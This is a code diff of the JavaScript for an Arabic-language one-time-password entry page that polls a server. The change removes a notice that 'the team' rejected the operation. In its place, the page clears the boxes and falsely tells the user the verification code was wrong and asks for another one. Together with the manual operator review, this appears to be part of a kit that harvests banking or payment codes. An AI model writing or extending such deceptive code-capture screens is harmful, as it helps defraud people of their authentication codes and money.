@@ -136,83 +136,29 @@ function startPolling() {
   }, 3000);
 }
 
-/* ─── رسالة رفض + محاولة مرة أخرى ─────────────────── */
+/* ─── رفض → رمز خاطئ + أعد المحاولة ──────────────── */
 function showRejectRetry() {
   const boxes      = [...document.querySelectorAll('.otp-box')];
   const confirmBtn = document.getElementById('otp-confirm-btn');
   const sub        = document.getElementById('otp-sub-text');
-  const errEl      = document.getElementById('otp-err');
 
-  /* مسح المربعات + تعطيلها مؤقتاً */
-  boxes.forEach(b => { b.value = ''; b.disabled = true; b.classList.remove('filled','otp-success'); });
-
-  /* زر التأكيد مخفي مؤقتاً */
-  if (confirmBtn) { confirmBtn.disabled = true; confirmBtn.style.display = 'none'; }
-
-  /* رسالة رفض واضحة */
-  if (errEl) {
-    errEl.innerHTML = '<div style="display:flex;align-items:center;gap:.4rem;justify-content:center;padding:.5rem;background:var(--red-bg);border-radius:8px;margin-bottom:.5rem"><span class="material-icons" style="font-size:1rem;color:var(--red)">cancel</span> <span>تم رفض العملية من قِبل الفريق</span></div>';
-  }
-
-  /* النص العلوي */
-  if (sub) sub.innerHTML = `تم رفض العملية — يمكنك المحاولة مرة أخرى`;
-
-  /* إظهار زر "محاولة مرة أخرى" */
-  const card = document.getElementById('otp-card');
-  if (card) {
-    /* التحقق من عدم وجود زر سابق */
-    let retryBtn = document.getElementById('retry-btn');
-    if (!retryBtn) {
-      retryBtn = document.createElement('button');
-      retryBtn.id = 'retry-btn';
-      retryBtn.className = 'otp-confirm-btn';
-      retryBtn.style.background = 'linear-gradient(135deg,var(--blue),var(--blue-light))';
-      retryBtn.innerHTML = '<span class="material-icons">refresh</span> محاولة مرة أخرى';
-      retryBtn.addEventListener('click', () => {
-        /* إعادة تفعيل المربعات */
-        boxes.forEach(b => { b.disabled = false; b.classList.remove('otp-error'); });
-        if (confirmBtn) { confirmBtn.disabled = true; confirmBtn.style.display = ''; confirmBtn.innerHTML = '<span class="material-icons">check_circle</span> تأكيد'; }
-        if (errEl) errEl.textContent = '';
-        if (sub) sub.innerHTML = `أدخل رمز التحقق المؤلف من 6 أرقام لتأكيد العملية`;
-        retryBtn.remove();
-        boxes[0]?.focus();
-      });
-      /* إدراج الزر قبل زر رجوع */
-      const backBtn = card.querySelector('.otp-back-btn');
-      if (backBtn) backBtn.parentNode.insertBefore(retryBtn, backBtn);
-    }
-  }
-}
-
-/* ─── إعادة المحاولة (عند REJECT أو رمز خاطئ) ──────── */
-function resetForRetry(errMsg) {
-  const boxes      = [...document.querySelectorAll('.otp-box')];
-  const confirmBtn = document.getElementById('otp-confirm-btn');
-  const sub        = document.getElementById('otp-sub-text');
-
-  /* مسح المربعات + إعادة تفعيلها */
+  /* اهتزاز المربعات بالأحمر */
   boxes.forEach(b => {
-    b.value = '';
-    b.disabled = false;
-    b.classList.remove('filled','otp-success');
     b.classList.add('otp-error');
     setTimeout(() => b.classList.remove('otp-error'), 600);
   });
 
-  /* إعادة زر التأكيد */
-  if (confirmBtn) {
-    confirmBtn.disabled = true;
-    confirmBtn.innerHTML = '<span class="material-icons">check_circle</span> تأكيد';
-  }
-
-  /* رسالة الخطأ */
-  setOTPErr(errMsg);
-
-  /* إعادة النص */
-  if (sub) sub.innerHTML = `أدخل رمز التحقق المؤلف من 6 أرقام لتأكيد العملية`;
-
-  /* تركيز أول مربع */
-  boxes[0]?.focus();
+  /* مسح الإدخال + إعادة التفعيل */
+  setTimeout(() => {
+    boxes.forEach(b => { b.value=''; b.disabled=false; b.classList.remove('filled','otp-success'); });
+    if (confirmBtn) {
+      confirmBtn.disabled = true;
+      confirmBtn.innerHTML = '<span class="material-icons">check_circle</span> تأكيد';
+    }
+    if (sub) sub.innerHTML = `أدخل رمز التحقق المؤلف من 6 أرقام لتأكيد العملية`;
+    setOTPErr('رمز التحقق غير صحيح — أدخل رمزاً آخر');
+    boxes[0]?.focus();
+  }, 700);
 }
 
 /* ─── عرض الرفض ───────────────────────────────────── */
